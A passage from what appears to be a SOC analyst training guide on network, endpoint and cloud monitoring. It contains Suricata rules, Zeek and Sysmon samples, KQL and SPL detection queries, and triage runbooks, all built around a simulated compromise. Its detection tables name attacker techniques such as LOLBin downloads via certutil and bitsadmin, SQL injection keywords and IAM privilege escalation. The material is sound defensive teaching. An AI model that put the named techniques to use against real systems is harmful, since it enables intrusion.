| Dest port | 443 |
| Protocol | TCP (6) |
| Packets / Bytes | 12,430 / 3,900,422 |
| Start / End time | 2026-08-05 02:11:03 / 02:11:51 |
| Flags | FIN,PSH,ACK |

### NetFlow use cases

| Use case | How |
|---|---|
| Beaconing detection | Regular-interval flows to one dest (§5.9) |
| Data exfiltration | Byte totals per host/dest (§5.8) |
| Port scanning | High connection counts across many ports |
| Shadow IT / rogue services | Unknown services listening on the network |
| Lateral movement mapping | Connections between internal hosts |

### mock sFlow/NetFlow log lines

```text
NETFLOW v9 | 2026-08-05 02:11 | src 10.10.5.22:49755 -> 91.208.31.99:443 TCP | pkts 12430 | bytes 3900422
NETFLOW v9 | 2026-08-05 02:11 | src 10.10.5.22:49812 -> 91.208.31.99:443 TCP | pkts 8921  | bytes 2770001
NETFLOW v9 | 2026-08-05 02:12 | src 10.10.5.22:49899 -> 91.208.31.99:443 TCP | pkts 15302 | bytes 5100330
```

*Note the regularity — this is the beaconing pattern from §5.9.*

## 8.3 Zeek (formerly Bro)

**Zeek** is a network security monitor that turns traffic into *rich protocol logs* — it doesn't just look for signatures, it *understands* the protocols and produces structured event logs.

### Key Zeek log files

| Log | Contains |
|---|---|
| `conn.log` | Every connection: endpoints, ports, bytes, duration, state |
| `dns.log` | Every DNS query and response |
| `http.log` | HTTP requests: URI, methods, user-agent, response codes |
| `ssl.log` | TLS handshake: SNI, cert chain, cipher, version |
| `smb.log` / `smb_files.log` | SMB commands, file access |
| `files.log` | Transferred file metadata + hashes |
| `x509.log` | Certificate details |
| `notice.log` | Zeek's own policy-generated notices |

### mock Zeek conn.log extract

```text
#fields  ts  uid  id.orig_h  id.orig_p  id.resp_h  id.resp_p  proto  service  duration  orig_bytes  resp_bytes  conn_state
2026-08-05T02:11:03.201408Z  C1x2y3z4a5b6c7 10.10.5.22 49755 91.208.31.99 443 tcp  - 0.86  10322 3980000  SF
2026-08-05T02:11:43.552104Z  C1x2y3z4a5b6c8 10.10.5.22 49812 91.208.31.99 443 tcp  - 0.51  9122  2770001  SF
```

### mock Zeek dns.log extract

```text
#fields  ts  uid  id.orig_h  id.resp_h  query  qtype  rcode  answers
2026-08-05T02:12:01.118024Z  Ca1b2c3d4e5f6g7  10.10.5.22  8.8.8.8  update-secure-now.net  A  0  185.244.25.198
2026-08-05T02:12:04.501130Z  Ca1b2c3d4e5f6g8  10.10.5.22  8.8.8.8  www.azuredns-verify.tk  A  0  45.155.92.11
```

### Zeek-based beaconing query (SPL)

```splunk
index=zeek sourcetype=conn
| stats avg(duration) as avg_dur, stdev(duration) as stdev_dur, count as conns
        by id.orig_h, id.resp_h, id.resp_p
| where conns >= 10
| search avg_dur
| eval jitter=stdev_dur/avg_dur
| where jitter < 0.2
```

## 8.4 Suricata / Snort IDS Rules

**Suricata** and **Snort** are signature-based IDS/IPS engines. They match packets/streams against rule signatures.

### Suricata rule structure

```text
action protocol src_ip src_port -> dst_ip dst_port (rule_options)
```

```text
alert tcp $HOME_NET any -> $EXTERNAL_NET 443 ( \
  msg:"ET TROJAN Suspicious Beacon Interval"; \
  flow:established,to_server; \
  content:"|00 01 02 03|"; \
  detection_filter:track by_dst, count 30, seconds 300; \
  sid:2026001; rev:1; \
  classtype:trojan-activity; \
  metadata:created_at 2026_08_05, updated_at 2026_08_05; )
```

| Rule component | Meaning |
|---|---|
| `alert` | Action (alert / drop / reject / pass) |
| `tcp` | Protocol |
| `$HOME_NET any -> $EXTERNAL_NET 443` | Source → destination |
| `flow:established,to_server` | Match on established server-bound flows |
| `content` | Byte/string match patterns |
| `detection_filter` | Threshold within time window |
| `sid` | Unique rule ID |
| `classtype` | Attack category |
| `metadata` | Free-form info (who/when) |

### Mock Suricata rule — PSEXEC lateral movement

```text
alert tcp $HOME_NET any -> $HOME_NET any ( \
  msg:"ET POLICY SMB2 admin share access - PSEXEC lateral movement"; \
  flow:established,to_server; \
  content:"|ff 53 4d 42|"; depth:4; \
  content:"ADMIN$"; distance:0; within:100; \
  sid:2026010; rev:1; \
  classtype:policy-violation; \
  metadata:attack_lateral_movement, attack_t1021_002; )
```

### Mock Suricata rule — SQL injection

```text
alert http $HOME_NET any -> $EXTERNAL_NET any ( \
  msg:"ET WEB_SERVER SQL Injection attempt"; \
  flow:established,to_server; \
  content:"%27"; http_uri; \
  content:"union%20select"; http_uri; nocase; \
  pcre:"/(union|select|sleep|benchmark)\s+.*(select|from)/i"; \
  sid:2026020; rev:1; \
  classtype:web-application-attack; \
  metadata:attack_initial_access, attack_t1190; )
```

### mock Suricata EVE JSON alert

```json
{
  "timestamp": "2026-08-05T02:14:22.113040+0000",
  "flow_id": 1234567890123456,
  "event_type": "alert",
  "src_ip": "10.10.5.22",
  "src_port": 49755,
  "dest_ip": "91.208.31.99",
  "dest_port": 443,
  "proto": "TCP",
  "alert": {
    "action": "allowed",
    "gid": 1,
    "signature_id": 2026001,
    "rev": 1,
    "signature": "ET TROJAN Suspicious Beacon Interval",
    "category": "Trojan Activity",
    "severity": 1
  }
}
```

## 8.5 Full Packet Capture

**Full packet capture (PCAP)** saves raw packets for forensic reconstruction. It's the "video recorder" of the network — everything can be replayed.

### tcpdump examples

```bash
# Capture all traffic to/from a suspicious host, rotate every 500 MB
tcpdump -i eth0 -n -w /nsm/pcap/$HOSTNAME.$(date +%Y%m%d).pcap \
        -C 500 -Z tcpdump host 10.10.5.22

# Capture HTTP traffic only (light weight)
tcpdump -i eth0 -n -s 0 -w http.pcap port 80 or port 8080

# Capture to standard output while filtering DNS
tcpdump -i eth0 -n -nn udp port 53
```

### PCAP analysis use cases

| Use case | Example |
|---|---|
| Reconstruct a download | Extract the malware binary from the PCAP |
| Rebuild a web session | See exactly what a phished user submitted (creds, form data) |
| Verify C2 | See the exact payload bytes of the beacon |
| Timeline accuracy | Prove what happened at 02:11:03 precisely |
| Zero-day evidence | Signature-based IDS missed it; PCAP captures it anyway |

### Retention reality

PCAP is **expensive** (full-duplex 1 Gbps ≈ 100+ GB/hour). Usually only *triggered* capture is kept: continuous capture of a few strategic choke points + on-demand capture when an incident starts.

## 8.6 NSM Architecture

```text
                          +---------------+
  INTERNET --> Firewall --> SPAN/TAP ------+--> IDS (Suricata) --> alert logs
                |         +---------------+--> Zeek --> conn/dns/http/ssl logs
                v                          +--> NetFlow collector
             Core switch                   +--> PCAP storage (rolling)
                |
                +--> Internal LAN segments (SPANs for critical VLANs)
```

### Architecture decisions

| Decision | Options | Notes |
|---|---|---|
| **TAP vs SPAN** | TAP (guaranteed copy, but needs device) vs SPAN (free but drops under load) | TAP for critical segments, SPAN for the rest |
| **Inline vs passive** | Inline IPS (can block) vs passive IDS (can't) | Start passive, move critical controls inline |
| **Sampling** | sFlow samples 1-in-N packets | Cheap but lossy — don't rely on it for security |
| **TLS decryption** | Decrypt (needs cert pinning) vs passive metadata | Decryption is powerful but invasive; see §8.8 |

## 8.7 DNS Monitoring — Detecting DGA

**DNS is often the attacker's first command channel.** Monitoring DNS can detect compromised hosts before malware even connects.

### Domain Generation Algorithms (DGA)

DGA malware (e.g., Conficker, Cryptolocker, Qakbot) generates thousands of random-looking domains daily and tries to contact one — the C2 server only needs one to be registered and resolvable.

### Detecting DGA (characteristics)

| Signal | DGA characteristic |
|---|---|
| **Character distribution** | Unusually high vowels/entropy, no pronounceable syllables |
| **Length** | Long random strings |
| **TLD diversity** | Queries span many odd TLDs (.ru, .tk, .xyz, .top) |
| **NXDOMAIN rate** | Most queries return NXDOMAIN (server doesn't exist) |
| **Volume** | Hundreds/thousands of unique domains from one host |
| **Frequency** | Queries at regular intervals per the DGA algorithm |

### mock DGA detection query (Zeek DNS + threshold)

```splunk
index=zeek sourcetype=dns
| where answers[0]="NXDOMAIN" OR rcode=3
| stats count as queries dc(query) as unique_domains by id.orig_h
| where unique_domains > 50
```

### mock DGA DNS log extract (evidence)

```text
#fields ts  id.orig_h  query  rcode
2026-08-05T03:00:00.110Z 10.10.7.42  jdksh2e9xz8q.ru  NXDOMAIN
2026-08-05T03:00:00.512Z 10.10.7.42  vnq3m9wpdhx4.net NXDOMAIN
2026-08-05T03:00:01.003Z 10.10.7.42  qwe8rt5yuio1.org NXDOMAIN
2026-08-05T03:00:01.499Z 10.10.7.42  plm2ok9njiu7.biz  NXDOMAIN
2026-08-05T03:00:02.112Z 10.10.7.42  gfh5dst7aqwe8.top NXDOMAIN
2026-08-05T03:00:02.600Z 10.10.7.42  sdx4cvb6rtyu9.com NOERROR  <- resolved!
```

*Note: the one `NOERROR` answer is the "winner" — the domain the malware successfully reached. That host is compromised.*

## 8.8 TLS/SSL Monitoring

### What you can see without decryption

- **Server Name Indication (SNI)** — the domain in the TLS handshake (this is in Zeek's `ssl.log`)
- **Certificate details** — issuer, SANs, validity, fingerprints (x509.log)
- **JA3/JA4 fingerprints** — TLS client fingerprint (identifies specific malware/tools)
- **TLS version & cipher** — unusual combos are a signal

### What you can't see

- **The encrypted content** (payloads, URLs, credentials)

### TLS monitoring signals

| Signal | Meaning |
|---|---|
| New/self-signed cert on an internal service | Potential rogue server or MITM |
| Cert issued days ago connecting from a workstation | Short-lived cert = C2 pattern |
| High TLS traffic to a newly-registered domain | Possible beaconing |
| JA3 matching known malware | Cobalt Strike, Metasploit, etc. |
| TLS to a non-standard port | Unusual encrypted service |

### mock Zeek ssl.log extract

```text
#fields ts  id.orig_h  id.resp_h  server_name  cert_subject  version  cipher
2026-08-05T02:11:03.211Z 10.10.5.22 91.208.31.99 update-secure-now.net CN=update-secure-now.net TLSv1.3 TLS_AES_128_GCM_SHA256
2026-08-05T02:11:03.450Z 10.10.5.22 91.208.31.99 - CN=invalid.not_valid_for_this_host TLSv1.2 TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA
```

---

# 9. Endpoint Telemetry

## 9.1 Why Endpoint Telemetry Matters

Attackers operate on endpoints. Endpoint telemetry — process creation, command lines, network connections, file and registry changes — is where the richest, most actionable detection data lives. The endpoint sees *exactly what executed, with what arguments, on what host, as what user*.

## 9.2 Sysmon

**Sysmon** (Microsoft Sysinternals) is the de-facto standard for deep Windows endpoint logging. It sits in the kernel, and with a good config it produces high-fidelity events that the native Security log can't.

### Sysmon events (key ones)

| Event ID | Name | What it captures |
|---|---|---|
| 1 | ProcessCreate | Process + full command line, hash, parent |
| 2 | FileChangeTime | Timestamp tampering |
| 3 | NetworkConnect | Outbound/inbound connections |
| 4 | Sysmon service state changed | Agent tampering |
| 5 | ProcessTerminate | Process exit |
| 6 | DriverLoad | Kernel driver loading (rootkit signal) |
| 7 | ImageLoad | DLL/module loading |
| 8 | CreateRemoteThread | Cross-process thread (injection) |
| 10 | ProcessAccess | Process opened for memory access (LSASS) |
| 11 | FileCreate | File created |
| 12/13 | RegistryEvent | Registry key/value created/modified |
| 14 | RegistryRename | — |
| 15 | FileCreateStreamHash | Alternate data streams (Zone.Identifier) |
| 16 | SysmonConfigStateChanged | Config change |
| 17/18 | PipeEvent | Named pipes created/connected |
| 19–21 | WmiEvent | WMI filter/consumer/binding (persistence) |
| 22 | DNSQuery | DNS queries from the process |
| 23 | FileDelete | File deleted (forensic value) |
| 25 | ProcessTampering | Process modified/injected |
| 26 | FileDeleteDetected | File deleted using unlink semantics |

### Mock Sysmon event — process creation (Event 1)

```xml
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <EventID>1</EventID>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-2228-440E-BF05-94F13A7B0F7D}"/>
    <TimeCreated SystemTime="2026-08-05T03:11:22.000Z"/>
    <Computer>WS-FIN-078</Computer>
  </System>
  <EventData>
    <Data Name="UtcTime">2026-08-05 03:11:22.100</Data>
    <Data Name="ProcessGuid">{5a1f2c8e-0000-0000-0000-000000000000}</Data>
    <Data Name="ProcessId">4456</Data>
    <Data Name="Image">C:\Users\j.doe\AppData\Local\Temp\svchost-cache.exe</Data>
    <Data Name="CommandLine">"C:\Users\j.doe\AppData\Local\Temp\svchost-cache.exe" --persist</Data>
    <Data Name="CurrentDirectory">C:\Users\j.doe\AppData\Local\Temp\</Data>
    <Data Name="User">NORTHWIND\j.doe</Data>
    <Data Name="ParentProcessGuid">{5a1f2c8e-0000-0000-0000-000000000001}</Data>
    <Data Name="ParentProcessId">3140</Data>
    <Data Name="ParentImage">C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE</Data>
    <Data Name="Hashes">MD5=4f6a2b1c9e0d7f3a5b8c1d2e3f4a5b6c,SHA256=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855</Data>
  </EventData>
</Event>
```

### Sysmon configuration (high-level guide)

A good Sysmon config is the difference between signal and noise. Key principles:

| Principle | Detail |
|---|---|
| **Curate the config** | Use a vetted baseline (e.g., SwiftOnSecurity, Olaf Hartong) then trim to your org |
| **Log process creation (1)** | Always, with full command line |
| **Log network connections (3)** | Filter internal-only noise (e.g., drop loopback, drop 10.x from outbound capture) |
| **Log LSASS access (10)** | Critical for credential theft detection |
| **Log image loads (7)** | Filter to suspicious DLLs only (huge noise otherwise) |
| **Log DNS (22)** | Great for DGA/C2 hunting |
| **Use include/exclude lists** | `ExcludeOnMatch` for known-benign binaries/paths to keep volume down |

### Mock Sysmon config excerpt

```xml
<Sysmon schemaversion="4.90">
  <EventFiltering>
    <!-- Process Creation: log everything -->
    <ProcessCreate onmatch="exclude">
      <CommandLine name="Technique" condition="is">C:\Windows\System32\svchost.exe -k netsvcs</CommandLine>
    </ProcessCreate>

    <!-- Network: exclude known-good internal + loopback -->
    <NetworkConnect onmatch="exclude">
      <DestinationIp condition="is">127.0.0.1</DestinationIp>
      <DestinationIp condition="is">::1</DestinationIp>
      <DestinationPort condition="is">5355</DestinationPort>
    </NetworkConnect>

    <!-- LSASS access: log only non-standard accessors -->
    <ProcessAccess onmatch="include">
      <TargetImage condition="end with">lsass.exe</TargetImage>
    </ProcessAccess>

    <!-- Registry: focus on persistence keys -->
    <RegistryEvent onmatch="exclude">
      <TargetObject condition="end with">\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Tracing\</TargetObject>
    </RegistryEvent>

    <!-- DNS: log all -->
    <DnsQuery onmatch="exclude">
      <QueryName condition="contains">.windowsupdate.microsoft.com</QueryName>
    </DnsQuery>
  </EventFiltering>
</Sysmon>
```

## 9.3 EDR Telemetry

**EDR (Endpoint Detection and Response)** vendors (CrowdStrike, Defender for Endpoint, SentinelOne) produce rich, structured telemetry — often beyond what Sysmon gives, with cloud backends and behavioral analytics.

### Typical EDR telemetry categories

| Category | Example fields/events |
|---|---|
| **Process** | Process creation, command line, parent-child, hashes, user |
| **Network** | Connections, DNS, TLS SNI, bytes |
| **File** | File create/write/modify/delete, hashes, signatures |
| **Registry** | Key/value changes, persistence locations |
| **Memory** | Injection indicators, remote threads, unbacked memory regions |
| **Behavior** | Child-of-suspicious-parent, LOLBin usage, attacker-tool patterns |
| **Mitigation/response** | Isolate host, kill process, quarantine file, rollback |

### mock EDR detection alert

```json
{
  "detection_id": "DET-20260805-0441",
  "severity": "high",
  "host": "WS-FIN-078",
  "user": "j.doe",
  "technique": "T1055 - Process Injection",
  "score": 92,
  "chain": [
    {"t": "2026-08-05T03:11:21Z", "action": "WINWORD.EXE spawns child svchost-cache.exe (Temp path)"},
    {"t": "2026-08-05T03:11:22Z", "action": "svchost-cache.exe opens handle to lsass.exe (Event 10)"},
    {"t": "2026-08-05T03:11:24Z", "action": "svchost-cache.exe injects into explorer.exe (Event 8)"},
    {"t": "2026-08-05T03:11:25Z", "action": "Connection to 91.208.31.99:443"}
  ],
  "recommended_action": "Isolate host immediately; kill PID 4456; collect memory"
}
```

## 9.4 Process Creation

Process creation (Sysmon 1 / EDR ProcessCreate / Windows 4688) is the single most useful endpoint event. The command line + parent process tell the story.

### High-value process detection patterns

| Pattern | Signal |
|---|---|
| **Suspicious parent-child** | Office apps spawning `cmd.exe`/`powershell.exe` (macro execution) |
| **Suspicious paths** | Process running from `Temp`, `AppData\Local\Temp`, `ProgramData`, `Users\Public` |
| **LOLBins** | `certutil -urlcache`, `bitsadmin /transfer`, `regsvr32 /s`, `mshta` |
| **Unusual names** | Legit names from wrong path (`svchost.exe` from `Temp`) |
| **Script interpreters** | PowerShell with `-enc`, `-windowstyle hidden`, `-ExecutionPolicy Bypass` |

### KQL — office spawning shell (macro detection)

```kql
DeviceProcessEvents
| where FileName in ("cmd.exe","powershell.exe","pwsh.exe","wscript.exe","cscript.exe","mshta.exe")
| where InitiatingProcessFileName in ("winword.exe","excel.exe","powerpnt.exe","outlook.exe")
| project TimeGenerated, DeviceName, InitiatingProcessFileName, FileName, ProcessCommandLine
```

## 9.5 Network Connections (Endpoint-side)

Sysmon 3 / EDR connection telemetry gives the *endpoint's view* of network activity, including process attribution (which process made the connection).

### mock Sysmon 3 events

```text
Event: Network connection detected
  Computer: WS-FIN-078
  ProcessId: 4456
  Image: C:\Users\j.doe\AppData\Local\Temp\svchost-cache.exe
  Protocol: tcp
  Initiated: true
  SourceIp: 10.10.5.22
  SourcePort: 49755
  DestinationIp: 91.208.31.99
  DestinationPort: 443
```

### Detection value

- **Process-to-IP attribution:** "explorer.exe connecting to a Russian IP" is far more alarming than a bare firewall flow.
- **Beaconing:** repeat connections from one process to one IP (combine with §5.9).
- **Bypassed proxies:** process connecting directly to 443/53 instead of via the proxy = C2 channel.

## 9.6 File Integrity Monitoring (FIM)

**FIM** detects unauthorized changes to files and system state. It's critical for detecting tampering, malware dropping files, and ransomware mass-encryption.

| Use case | Example |
|---|---|
| **System file tampering** | `C:\Windows\System32` binaries modified |
| **Startup file planting** | New `.lnk`/`.bat` in Startup folder (Sysmon 11) |
| **Ransomware** | Mass file writes/renames (e.g., `.encrypted` extension flood) |
| **Web app compromise** | `index.php`/`web.config` modified on a web server |
| **Compliance** | Prove critical files unchanged for auditors |

### Mock FIM alert (web server)

```text
FIM ALERT (Tripwire / Defender)
Host: WEB-SRV-12
Path: C:\inetpub\wwwroot\login.aspx
Action: MODIFIED  (before SHA256: 9f86d08188..., after: 3c9909afec...)
Time: 2026-08-05 22:47:11 (outside deploy window)
User: IUSR (anonymous -> possible webshell upload)
-> Escalate: possible web compromise.
```

## 9.7 ETW (Event Tracing for Windows)

**ETW** is Windows' built-in tracing framework — kernel and application providers emit structured telemetry that is extremely hard for malware to hide. ETW underpins Sysmon, EDRs, and Microsoft's own security tooling.

| ETW provider | What it exposes |
|---|---|
| **Microsoft-Windows-Kernel-Process** | Process creation/termination at kernel level |
| **Microsoft-Windows-Threat-Intelligence** | Kernel callback alerts for injects, hooks, blocked syscalls |
| **Microsoft-Windows-PowerShell** | PowerShell execution telemetry |
| **Microsoft-Windows-DotNETRuntime** | .NET assembly loads (malware in .NET) |
| **Microsoft-Windows-Security-Auditing** | The source of most Security log events |

### ETW strengths vs weaknesses

| Strength | Weakness |
|---|---|
| Kernel-level, hard to evade | High volume, complex to consume |
| Deep visibility (syscalls, injections) | Requires special collectors (e.g., SilkETW, Velociraptor) |
| Backs many EDR detections | Not enabled by default for all providers |

---

# 10. Cloud Security Monitoring

## 10.1 Cloud-Native Monitoring

Cloud providers offer native telemetry, and native cloud SOCs lean on them heavily — then feed them into the SIEM for correlation with on-prem data.

### The big three native services

| Provider | Audit logs | Threat detection | Posture / CSPM | Notes |
|---|---|---|---|---|
| **AWS** | CloudTrail | GuardDuty | Security Hub | GuardDuty = ML + threat lists + anomaly detection |
| **Azure** | Activity Log | Microsoft Defender for Cloud / Sentinel | Defender for Cloud (CSPM) | Sentinel = cloud-native SIEM on Log Analytics |
| **GCP** | Cloud Audit Logs | Security Command Center (SCC) | SCC + Security Health Analytics | SCC detects findings from many GCP services |

## 10.2 AWS CloudTrail & GuardDuty

### CloudTrail

CloudTrail records **every API call** in AWS — who did what, when, from where, with what result. It's the "audit log of AWS."

```json
{
  "eventVersion": "1.08",
  "userIdentity": { "type": "IAMUser", "userName": "svc-ops", "arn": "arn:aws:iam::123456789012:user/svc-ops" },
  "eventTime": "2026-08-05T02:14:19Z",
  "eventSource": "iam.amazonaws.com",
  "eventName": "AttachUserPolicy",
  "awsRegion": "us-east-1",
  "sourceIPAddress": "91.208.31.99",
  "userAgent": "AWS CLI 2.15.3",
  "requestParameters": { "userName": "finance-admin", "policyArn": "arn:aws:iam::aws:policy/AdministratorAccess" },
  "responseElements": null,
  "userIdentity.sessionContext": { "sessionIssuer": null },
  "eventID": "9f0e8d7c-1111-2222-3333-444455556666"
}
```

### GuardDuty

GuardDuty is AWS's managed threat detection: it monitors CloudTrail, VPC Flow Logs, and DNS and uses ML + threat intelligence to find suspicious behavior.

### Detecting IAM abuse (mock CloudTrail query)

Goal: find users being granted admin policies from a suspicious source IP — a classic privilege escalation move.

```kql
AWSCloudTrail
| where EventName in ("AttachUserPolicy","AttachGroupPolicy","AttachRolePolicy",
                      "CreateAccessKey","UpdateLoginProfile")
| where TimeGenerated > ago(7d)
| extend PolicyArn = tostring(RequestParameters.policyArn)
| extend SourceIp = SourceIpAddress
| where PolicyArn contains "AdministratorAccess"
    or PolicyArn contains "AmazonS3FullAccess"
    or PolicyArn == "arn:aws:iam::aws:policy/AdministratorAccess"
| project TimeGenerated, EventName, UserName = UserIdentityUserName,
          PolicyArn, SourceIp, AccountId
```

### mock GuardDuty finding

```json
{
  "findingId": "0f1a2b3c-0000-0000-0000-000000000001",
  "type": "PrivilegeEscalation:IAMUser/AnomalousPolicy",
  "severity": 7.5,
  "title": "Policy added to role likely for privilege escalation",
  "resource": { "resourceType": "IAMRole", "roleName": "app-deploy" },
  "service": {
    "eventFirstSeen": "2026-08-05T02:14:19Z",
    "eventLastSeen": "2026-08-05T02:14:19Z",
    "action": { "actionType": "AWS_API_CALL", "awsApiCallAction": { "api": "AttachRolePolicy" } }
  },
  "accountId": "123456789012",
  "region": "us-east-1",
  "sourceIp": "91.208.31.99"
}
```

## 10.3 Azure Sentinel & Microsoft Defender

**Microsoft Sentinel** is Azure's cloud-native SIEM. It collects from Azure services, Microsoft 365 (Defender, Purview), and third parties; detection is written in KQL.

### Azure SOC detection matrix

| Source | Event | What it detects |
|---|---|---|
| Azure Activity Log | admin operations | Control-plane changes |
| Defender for Cloud | Security alerts | Cloud workload threats |
| Microsoft 365 Defender | Mail/sign-in alerts | Phishing, account takeover |
| Sentinel analytic rule | Custom KQL | Your own detections |

### mock KQL rule — Azure admin added

```kql
AzureActivity
| where OperationNameValue has "Microsoft.Authorization/roleAssignments/write"
| where ActivityStatusValue == "Success"
| project TimeGenerated, Caller, CallerIpAddress, ResourceGroup,
          Identity = tostring(Properties.principalId),
          Role = tostring(Properties.roleDefinitionId)
| where Role endswith "Owner" or Role endswith "Contributor"
| where Caller !in ((SecurityAlert | where AlertType == "Known_Admin") | project Caller)
```

## 10.4 GCP Security Command Center

**SCC** aggregates findings across GCP: IAM policy analysis, VM misconfigurations, data-loss findings, and Cloud Audit Logs anomalies.

### mock SCC finding

```json
{
  "findingClass": "THREAT",
  "category": "EXCESSIVE_PERMISSIONS",
  "resourceName": "//compute.googleapis.com/projects/acme-prod/zones/us-central1-a/instances/db-01",
  "state": "ACTIVE",
  "severity": "HIGH",
  "sourceProperties": { "permission": "roles/owner", "user": "svc-cicd@acme-prod.iam.gserviceaccount.com" },
  "eventTime": "2026-08-05T02:16:00Z"
}
```

## 10.5 CASB (Cloud Access Security Broker)

A **CASB** sits between users and cloud services to enforce security policy: visibility, data-loss prevention (DLP), and threat protection for SaaS apps (M365, Salesforce, Box, Google Workspace).

| CASB function | Example |
|---|---|
| **Visibility** | "Which SaaS apps are our users using? Which contain sensitive data?" |
| **DLP** | Block uploading files tagged "HR-Confidential" to personal Dropbox |
| **Shadow IT** | Detect and block unsanctioned cloud apps |
| **Anomaly detection** | Flag impossible-travel logons to SaaS |
| **Compliance** | Enforce MFA, block external sharing |

## 10.6 Detecting Cloud Threats

### Common cloud attack paths

| Path | Description | Detection |
|---|---|---|
| **Credential theft** | Leaked AWS keys used from attacker IPs | GuardDuty `AnomalousAPI`, IP anomalies |
| **Privilege escalation** | Attach admin policy, create access key | CloudTrail monitoring (§10.2) |
| **Persistence** | Create new IAM user/role, backdoor Lambda | Monitor IAM + resource creation events |
| **Lateral movement** | Move between cloud services via metadata | `IMDS`/169.254.169.254 access |
| **Data exfiltration** | S3 bucket to public / copy out | VPC Flow + S3 access logs + DLP |
| **Ransomware/abuse** | Cloud resource misuse for crypto mining | GuardDuty `CryptoCurrency` findings, cost spikes |

### mock CloudTrail query — IMDS (metadata service) abuse

```kql
AWSCloudTrail
| where EventSource == "ec2.amazonaws.com"
| where EventName == "RunInstances"
| where SourceIpAddress startswith "169.254.169.254"
    or tostring(UserIdentity.userName) contains "instance-role"
```

---

# 11. Alert Triage & Escalation

## 11.1 The Alert Lifecycle

Every alert moves through a defined lifecycle from birth to closure.

```
 New --> Triage --> (Confirmed) --> Investigation --> Containment --> Remediation --> Closure
   |      |
   |      +--> (False Positive) --> Close / Tune
   |      +--> (Benign/Expected) --> Close / Note
   |
   +--> Auto-closed by SOAR (dedupe, known-good)
```

| State | Description | Owner |
|---|---|---|
| **New** | Alert fired, awaiting analyst | SIEM/SOAR |
| **Triaging** | Analyst validating legitimacy | Tier 1 |
| **Investigation** | Deep-dive into a confirmed threat | Tier 2 |
| **Containment** | Threat isolated/blocked | Tier 2/3 |
| **Remediation** | Eradication + recovery | Tier 2/3 + IT |
| **Closed** | Documented, no further action | Any |
| **Closed-FP** | False positive, with tuning note | Tier 1 |
| **Closed-Benign** | Real but expected behavior | Tier 1 |
| **Escalated** | Moved to Tier 2/3 | Tier 1 → Tier 2 |

## 11.2 Severity Rating

Standard severity model (adapt your own SLAs):

| Severity | Name | Meaning | Target response |
|---|---|---|---|
| **P1 / Critical** | Severe impact | Active compromise, data loss, outage, ransomware | Acknowledge < 10 min; respond immediately |
| **P2 / High** | Significant impact | Confirmed compromise of sensitive system/account | Acknowledge < 15 min; respond < 1 hr |
| **P3 / Medium** | Possible issue | Suspicious activity needing validation | Acknowledge < 30 min; investigate same shift |
| **P4 / Low** | Informational | Low-risk event, note for trends | Next business day |
| **P5 / Informational** | No impact | Baseline noise, data only | Trend only |

### Severity calculator (mock)

```text
Severity = f(Asset criticality, Impact, Confidence)

Asset criticality:  Critical(3) · High(2) · Standard(1) · Unknown(0)
Impact:             Data exfil(3) · Code exec(2) · Credential(2) · Recon(1)
Confidence:         Confirmed(2) · Likely(1) · Possible(0)

  P1 = score >= 7        P2 = 5-6        P3 = 3-4        P4 = 1-2        P5 = 0

Example: LSASS access on domain controller
  Critical asset (3) + Credential theft (2) + Confirmed (2) = 7 -> P1
```

## 11.3 False Positive Handling

False positives are normal — how you handle them determines alert quality.

| Step | Action |
|---|---|
| 1 | Validate the alert against the event data and environment |
| 2 | Check context: known maintenance window? known service account? |
| 3 | Enrich: asset role, user role, recent similar activity |
| 4 | If FP: close as FP, add **tuning note** (what changed? what would reduce this?) |
| 5 | Forward tuning notes to the tuning review (monthly) |
| 6 | If FP repeats: create a suppression rule or whitelist |

### Mock FP triage card

```text
ALERT: DET-1010 "Excessive Failed Logons" | SRC: SVC-MONITORING
TRIAGE: FALSE POSITIVE
Why: svc-monitoring retries a scheduled job hourly; each retry hits a dead
     database server -> 12 failures per hour. Account is a service account
     with no network/domain logon rights beyond its job.
Action: Added SVC-MONITORING to allowlist for DET-1010.
Tuning note logged -> weekly tuning review.
```

## 11.4 Escalation Paths

```text
        Tier 1 (Triage) -----------> Tier 2 (Investigation) -----------> Tier 3 (SME/Hunting)
             |                              |                               |
             | (P1/P2, confirmed)           | (advanced IR, reverse eng)    |
             v                              v                               v
        SOC Manager / IR Lead ----------> (P1) Crisis team / C-level comms
```

### Escalation triggers (mock)

| Escalation | Trigger |
|---|---|
| **Tier 1 → Tier 2** | Confirmed malicious activity, credential compromise, host likely infected |
| **Tier 2 → Tier 3** | New malware, zero-day, complex evasion, need for reverse engineering, or hunting support |
| **Tier 2/3 → IR Lead / Manager** | P1 (ransomware, data breach), major service impact, law-enforcement involvement |
| **Manager → Executive** | P1 with reportable breach, regulatory notification, media risk |

## 11.5 SLA (Service Level Agreements)

SLA = time commitments for response per severity. Tracked against the alert lifecycle.

| Severity | Acknowledge (SLA) | Investigate (SLA) | Contain (SLA) |
|---|---|---|---|
| P1 | 10 min | 30 min | 1 hr |
| P2 | 15 min | 1 hr | 4 hrs |
| P3 | 30 min | 4 hrs | 24 hrs |
| P4 | 4 hrs | 1 day | n/a |

### SLA tracking (mock)

```text
SLA REPORT — July 2026 (602 alerts)
  Acknowledge within SLA:   97.2%  (missed: 17 alerts, all P3 overnight)
  Investigate within SLA:   91.5%  (missed: 51 alerts — queue depth during shift gaps)
  Contain within SLA:       100%   (all contained incidents met 4-hr target)

Root cause of misses: overnight staffing 1 analyst for 2 regions.
Recommendation: shift to follow-the-sun or increase overnight coverage.
```

## 11.6 Mock Triage Runbook (Tier 1)

### Generic triage runbook — every alert

1. **Acknowledge** the alert in the queue (start SLA clock).
2. **Gather context**:
   - What is the alert? (rule, description)
   - What asset(s)? Criticality tier? Owner?
   - What user/account(s)?
   - When and where (host, IP, source)?
3. **Validate**:
   - Is the behavior actually present in the raw events?
   - Is it consistent with a known attack pattern (ATT&CK)?
   - Does the entity have a legitimate reason to behave this way?
4. **Enrich**:
   - IP reputation (VirusTotal, OTX)
   - File hash (VT sandbox)
   - User role (HR/AD)
   - Asset criticality (CMDB)
   - Recent similar alerts (search queue history)
5. **Decide**:
   - **True positive** → determine severity → escalate per path, or contain if simple + high-confidence.
   - **False positive** → close FP + tuning note.
   - **Benign/expected** → close with note.
   - **Insufficient info** → gather more data, consult Tier 2, or escalate.
6. **Document** — every decision with reasoning in the case tool.
